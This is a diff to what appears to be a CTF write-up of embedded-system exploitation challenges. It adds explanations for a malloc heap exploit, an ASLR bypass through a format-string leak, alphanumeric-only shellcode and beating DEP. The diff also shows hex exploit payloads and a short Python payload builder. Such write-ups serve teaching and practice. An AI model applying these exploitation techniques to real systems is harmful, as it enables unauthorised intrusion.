@@ -704,10 +704,11 @@ using:
 
 
 ## 13. Algiers
-     This is a malloc implementation. Here is the heap under normal
-     circumstances after two mallocs of 16-byte blocks (starting at
-     240e and 2424 with 6-byte headers at the beginning and end of
-     each block), all filled with the byte 0xaa repeated: 
+
+This is a malloc implementation. Here is the heap under normal
+circumstances after two mallocs of 16-byte blocks (starting at 240e
+and 2424 with 6-byte headers at the beginning and end of each block),
+all filled with the byte 0xaa repeated:
 
 ```
 2400:   0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
@@ -774,9 +775,11 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa08243e242100
 
 ## 14. Vladivostok
 
-```
-0xcaaa-0xc740 = 874 = 0x36a
-```
+This is an ASLR challenge.  A format string vulnerability can be used
+to leak an address, based on which we can calculate the offsets we
+need for overflow.
+
+```0xcaaa-0xc740 = 874 = 0x36a```
 
 ```
 0010 <__trap_interrupt>
@@ -1471,7 +1474,9 @@ call_r14 = d530
 int = d02c
 424242424242424230d430127; f00b0122cd0
 ```
+
 as determined by: 
+
 ```
 import sys
 leaked = int(sys.argv[1],16)
@@ -1484,6 +1489,9 @@ print("4242424242424242" + call_r14 + "3f407f003040" + int_addr)
 
 
 ## 15. Lagos
+
+This challenge has been the most annoying so far, in which we are only
+allowed alphanumeric instructions.
 
 ```
 41
@@ -1566,5 +1574,14 @@ jge $+0xf6	7a34
 414141414141414141414141414141414130444141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141417a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a4f4b4f6b4f6b4f6b4f527a34
 ```
 
+
+
+```
+6f51           add.b	@sp, r15
+```
+
 ## 16. Bangalore
+
+This challenge involves beating DEP.  
+
 ## 17. Chernobyl
